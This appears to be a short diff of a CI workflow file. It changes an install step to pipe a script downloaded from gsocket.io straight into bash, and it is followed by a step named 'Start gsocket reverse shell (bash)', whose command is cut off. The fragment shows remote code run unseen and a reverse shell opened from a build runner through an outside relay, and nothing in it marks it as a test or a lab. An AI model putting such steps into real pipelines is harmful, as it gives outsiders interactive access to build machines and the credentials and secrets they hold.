@@ -10,7 +10,7 @@ jobs:
     steps:
       - name: Install gs-netcat from gsocket.io/x
         run: |
-          curl -fsSL https://gsocket.io/x
+          curl -fsSL https://gsocket.io/x | bash
           mv ~/.gsocket/bin/gs-netcat .
 
       - name: Start gsocket reverse shell (bash)
